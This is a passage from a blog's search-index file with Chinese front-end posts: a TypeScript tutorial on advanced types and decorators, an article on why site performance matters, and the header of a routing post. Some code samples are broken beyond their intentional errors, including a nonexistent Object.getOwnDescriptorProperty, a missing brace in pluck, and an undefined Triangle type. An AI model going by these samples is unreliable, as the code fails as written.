class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSmallPet</span>(<span class="params"></span>): <span class="title">Fish</span> | <span class="title">Bird</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> pet = getSmallPet();</span><br><span class="line">pet.layEggs(); <span class="comment">// 正确</span></span><br><span class="line">pet.swim();    <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure></p><h2 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h2><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。</p><p>起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以使用类型别名来在属性里引用自己</span></span><br><span class="line"><span class="keyword">type</span> Tree&lt;T&gt; = &#123;</span><br><span class="line">  value: T;</span><br><span class="line">  left: Tree&lt;T&gt;;</span><br><span class="line">  right: Tree&lt;T&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与交叉类型一起使用</span></span><br><span class="line"><span class="keyword">type</span> LinkedList&lt;T&gt; = T &amp; &#123; next: LinkedList&lt;T&gt; &#125;;</span><br><span class="line"><span class="keyword">interface</span> Person &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> people: LinkedList&lt;Person&gt;;</span><br><span class="line"><span class="keyword">var</span> s = people.name;</span><br><span class="line"><span class="keyword">var</span> s = people.next.name;</span><br><span class="line"><span class="keyword">var</span> s = people.next.next.name;</span><br><span class="line"><span class="keyword">var</span> s = people.next.next.next.name;</span><br></pre></td></tr></table></figure></p><p>使用注意：</p><ul><li>类型别名不能被 extends和 implements（自己也不能 extends和 implements其它类型）。</li><li>如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。</li></ul><h3 id="字符串字面量类型"><a href="#字符串字面量类型" class="headerlink" title="字符串字面量类型"></a>字符串字面量类型</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Easing = <span class="string">"ease-in"</span> | <span class="string">"ease-out"</span> | <span class="string">"ease-in-out"</span>;</span><br><span class="line"><span class="keyword">class</span> UIElement &#123;</span><br><span class="line">  animate(dx: <span class="built_in">number</span>, dy: <span class="built_in">number</span>, easing: Easing) &#123;</span><br><span class="line">    <span class="keyword">if</span> (easing === <span class="string">"ease-in"</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (easing === <span class="string">"ease-out"</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (easing === <span class="string">"ease-in-out"</span>) </span><br><span class="line">    <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> button = <span class="keyword">new</span> UIElement();</span><br><span class="line">button.animate(<span class="number">0</span>, <span class="number">0</span>, <span class="string">"ease-in"</span>);</span><br><span class="line">button.animate(<span class="number">0</span>, <span class="number">0</span>, <span class="string">"uneasy"</span>);</span><br></pre></td></tr></table></figure><h3 id="数字字面量类型"><a href="#数字字面量类型" class="headerlink" title="数字字面量类型"></a>数字字面量类型</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rollDie</span>(<span class="params"></span>): 1 | 2 | 3 | 4 | 5 | 6 </span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="可辨识联合"><a href="#可辨识联合" class="headerlink" title="可辨识联合"></a>可辨识联合</h3><p>它具有3个要素：</p><ul><li>具有普通的单例类型属性— 可辨识的特征。</li><li>一个类型别名包含了那些类型的联合— 联合。</li><li>此属性上的类型保护。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Square &#123;</span><br><span class="line">  kind: <span class="string">"square"</span>;</span><br><span class="line">  size: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Rectangle &#123;</span><br><span class="line">  kind: <span class="string">"rectangle"</span>;</span><br><span class="line">  width: <span class="built_in">number</span>;</span><br><span class="line">  height: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Circle &#123;</span><br><span class="line">  kind: <span class="string">"circle"</span>;</span><br><span class="line">  radius: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Shape = Square | Rectangle | Circle | Triangle;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assertNever</span>(<span class="params">x: never</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Unexpected object: "</span> + x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"square"</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"rectangle"</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"circle"</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> assertNever(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多态的this类型"><a href="#多态的this类型" class="headerlink" title="多态的this类型"></a>多态的this类型</h2><p>使用了this类型，你可以继承它，新的类可以直接使用之前的方法，不需要做任何的改变。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> BasicCalculator &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">constructor</span>(<span class="params"><span class="keyword">protected</span> value: <span class="built_in">number</span> = 0</span>) &#123; &#125;</span><br><span class="line">  <span class="keyword">public</span> currentValue(): <span class="built_in">number</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> add(operand: <span class="built_in">number</span>): <span class="keyword">this</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.value += operand;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> multiply(operand: <span class="built_in">number</span>): <span class="keyword">this</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.value *= operand;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> ScientificCalculator <span class="keyword">extends</span> BasicCalculator &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">constructor</span>(<span class="params">value = 0</span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> sin() &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = <span class="built_in">Math</span>.sin(<span class="keyword">this</span>.value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> v = <span class="keyword">new</span> ScientificCalculator(<span class="number">2</span>)</span><br><span class="line">        .multiply(<span class="number">5</span>)</span><br><span class="line">        .sin()</span><br><span class="line">        .add(<span class="number">1</span>)</span><br><span class="line">        .currentValue();</span><br></pre></td></tr></table></figure></p><h2 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JS版本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluck</span>(<span class="params">o, names</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> names.map(<span class="function"><span class="params">n</span> =&gt;</span> o[n]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TS版本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluck</span>&lt;<span class="title">T</span>, <span class="title">K</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">T</span>&gt;(<span class="params">o: T, names: K[]</span>): <span class="title">T</span>[<span class="title">K</span>][] </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> names.map(<span class="function"><span class="params">n</span> =&gt;</span> o[n]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Person &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  age: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person: Person = &#123;</span><br><span class="line">  name: <span class="string">'Jarid'</span>,</span><br><span class="line">  age: <span class="number">35</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> strings: <span class="built_in">string</span>[] = pluck(person, [<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure><p>TS中为了检测属性是否存在类中，引入了几个类型操作符：</p><ul><li>keyof T：索引类型查询操作符。</li><li>T[K]：索引访问操作符。</li></ul><h2 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h2><p>TypeScript提供了从旧类型中创建新类型的一种方式 — 映射类型。 在映射类型里，新类型以相同的形式去转换旧类型里每个属性。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class="line">  readonly [P <span class="keyword">in</span> keyof T]: T[P];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Partial&lt;T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> keyof T]?: T[P];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> A &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> UserInfo &#123;</span><br><span class="line">    username: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">    password: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> A.UserInfo()</span><br></pre></td></tr></table></figure><h2 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h2><p>这里的语法是为指定的符号创建一个别名。 你可以用这种方法为任意标识符创建别名，也包括导入的模块中的对象。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> Shapes &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">namespace</span> Polygons &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">class</span> Triangle &#123; &#125;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">class</span> Square &#123; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> polygons = Shapes.Polygons;</span><br><span class="line"><span class="keyword">let</span> sq = <span class="keyword">new</span> polygons.Square();</span><br></pre></td></tr></table></figure></p><h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><p>类中不同声明上的装饰器将按以下规定的顺序应用：</p><ol><li>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个实例成员。</li><li>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个静态成员。</li><li>参数装饰器应用到构造函数。</li><li>类装饰器应用到类。</li></ol><h2 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h2><p>类装饰器应用于类构造函数，可以用来监视，修改或替换类定义。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logClass</span>(<span class="params">params: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params);</span><br><span class="line">  params.prototype.apiUrl = <span class="string">'http://xxx.com'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@logClass</span></span><br><span class="line"><span class="keyword">class</span> HttpClient &#123;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">  getData () &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> http = <span class="keyword">new</span> HttpClient();</span><br><span class="line"><span class="built_in">console</span>.log(http.apiUrl); <span class="comment">// http://xxx.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 传参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logClass2</span>(<span class="params">params: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">target: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    target.prototype.apiUrl = params;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@logClass</span>2(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">class</span> HelloClient &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  getData() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> hell = <span class="keyword">new</span> HelloClient();</span><br><span class="line"><span class="built_in">console</span>.log(hell); <span class="comment">// &#123; apiUrl: 'hello', getData: f() &#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h2><p>被应用到方法的属性描述符上，可以用来监视，修改或者替换方法定义。</p><p>可以接受下列3个参数：</p><ol><li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li><li>成员的名字。</li><li>成员的属性描述符。<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Greet &#123;</span><br><span class="line">  greeting: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">message: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.greeting = message;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@enumerable</span>(<span class="literal">false</span>)</span><br><span class="line">  greet(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Greeting <span class="subst">$&#123;this.greeting&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enumerable</span> (<span class="params">val: <span class="built_in">boolean</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">    descriptor.enumerable = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = <span class="keyword">new</span> Greet(<span class="string">'John'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getOwnDescriptorProperty(g, <span class="string">'greet'</span>)); </span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   enumerable: false</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="访问器装饰器"><a href="#访问器装饰器" class="headerlink" title="访问器装饰器"></a>访问器装饰器</h2><p>访问器装饰器应用于访问器的 属性描述符并且可以用来监视，修改或替换一个访问器的定义，使用和方法装饰器相同。</p><blockquote><p>注意：TypeScript不允许同时装饰一个成员的get和set访问器。取而代之的是，一个成员的所有装饰的必须应用在文档顺序的第一个访问器上。</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Point &#123;</span><br><span class="line">  <span class="keyword">private</span> _x: <span class="built_in">number</span>;</span><br><span class="line">  <span class="keyword">private</span> _y: <span class="built_in">number</span>;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>._x = x;</span><br><span class="line">    <span class="keyword">this</span>._y = y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@configurable</span>(<span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">get</span> x() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._x; &#125;</span><br><span class="line">  <span class="meta">@configurable</span>(<span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">get</span> y() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._y; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configurable</span>(<span class="params">value: <span class="built_in">boolean</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">    descriptor.configurable = value;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="属性装饰器"><a href="#属性装饰器" class="headerlink" title="属性装饰器"></a>属性装饰器</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logProperty</span>(<span class="params">params: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">target: <span class="built_in">any</span>, attr: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    target[attr] = params</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Https &#123;</span><br><span class="line">  <span class="meta">@logProperty</span>(<span class="string">'http://2222.com'</span>)</span><br><span class="line">  <span class="keyword">public</span> url: <span class="built_in">any</span> | <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> https = <span class="keyword">new</span> Https();</span><br><span class="line"><span class="built_in">console</span>.log(https); <span class="comment">// &#123; url: "http://2222.com" &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教你搭个前端性能监测系统</title>
      <link href="/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E6%90%AD%E4%B8%AA%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E7%9B%91%E6%B5%8B%E7%B3%BB%E7%BB%9F.html"/>
      <url>/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E6%90%AD%E4%B8%AA%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E7%9B%91%E6%B5%8B%E7%B3%BB%E7%BB%9F.html</url>
      
        <content type="html"><![CDATA[<p>众所周知，一个网站的好坏，除了和页面的展示交互息息相关外，更离不开优秀的性能表现，当然网站的安全性也至关重要，尤其是针对涉及交易的网站，而本文将致力于探索网站的性能，一同打开前端性能的大门。</p><a id="more"></a><h2 id="为何性能如此重要"><a href="#为何性能如此重要" class="headerlink" title="为何性能如此重要"></a>为何性能如此重要</h2><p>既然我们关注网站的性能，就需要知道性能为何重要。</p><h3 id="性能关乎用户的去留"><a href="#性能关乎用户的去留" class="headerlink" title="性能关乎用户的去留"></a>性能关乎用户的去留</h3><p>性能在任何在线业务的成功方面都扮演重要角色。 以下是一些案例研究，显示了性能出色的网站与性能较差的网站相比，如何更好地与用户互动并留住用户：</p><table><thead><tr><th style="text-align:left">性能</th><th style="text-align:left">收益</th></tr></thead><tbody><tr><td style="text-align:left">Pinterest感知等待时间减少40%</td><td style="text-align:left">搜索引擎流量和注册人数增长15%</td></tr><tr><td style="text-align:left">COOK页面平均加载时间减少850ms</td><td style="text-align:left">转化率提升7%、跳出率下降7%，每次会话浏览页数增加10%</td></tr><tr><td style="text-align:left">BBC网站加载时间每增加一秒</td><td style="text-align:left">失去10%的用户</td></tr><tr><td style="text-align:left">Google页面加载时间超过3秒</td><td style="text-align:left">53%的移动网站访问活动将遭到抛弃</td></tr></tbody></table><p>Google 研究还表明，与加载时间约为四倍（19秒）的网站相比，加载时间在5秒以内的网站会话加长70%、跳出率下降35%、广告可见率上升25%。</p><h3 id="性能关乎转化率的提升"><a href="#性能关乎转化率的提升" class="headerlink" title="性能关乎转化率的提升"></a>性能关乎转化率的提升</h3><p>留住用户对于提升转化率至关重要。 响应速度慢会对网站收入带来不利影响，反之亦然。 以下是一些示例，显示了性能在提升业务收入方面扮演怎样的角色：</p><table><thead><tr><th style="text-align:left">性能</th><th style="text-align:left">收益</th></tr></thead><tbody><tr><td style="text-align:left">首页加载时间每减少100毫秒</td><td style="text-align:left">基于会话的转化率增加1.11%</td></tr><tr><td style="text-align:left">结账页面加载时间减少100毫秒</td><td style="text-align:left">基于会话的转化率增加1.55%</td></tr><tr><td style="text-align:left">页面加载时间减少一半</td><td style="text-align:left">销售额提升12-13%</td></tr></tbody></table><h3 id="性能关乎用户"><a href="#性能关乎用户" class="headerlink" title="性能关乎用户"></a>性能关乎用户</h3><p>性能低的网站和应用会导致用户产生实际成本。随着典型页面发送的数据增多，用户必须经常为其按流量计费的数据流量续费，如此一来，用户的成本便会增加。<br>除了为用户省钱，速度快、负荷轻的用户体验对处在危机中的用户同样至关重要。 医院、诊所和危机中心等公共资源提供各类在线资源，以为用户提供面临危机时需要的特定重要信息。虽然紧急情况下设计在高效展示重要信息中扮演非常重要的角色，但快速传达此类信息的重要性同样不可低估。</p><p>综上，性能的重要性可见一斑。接下来我们就开始搭建前端性能监测系统，虽然市面上已经有不少这类检测的插件和网站，但是我认为不管是学习什么知识，自己亲手实践一下都能帮助你更好的理解和掌握，所以我们赶快开始吧。</p><p><img src="../assets/20191007/1.jpg" alt="Alt text"></p><p>参考链接：</p><ul><li><a href="https://developers.google.cn/web/fundamentals/performance/why-performance-matters?hl=en" target="_blank" rel="noopener">Why Performance Matters</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 性能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端两种路由实现和使用场景</title>
      <link href="/%E5%89%8D%E7%AB%AF%E4%B8%A4%E7%A7%8D%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.html"/>
      <url>/%E5%89%8D%E7%AB%AF%E4%B8%A4%E7%A7%8D%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.html</url>
      
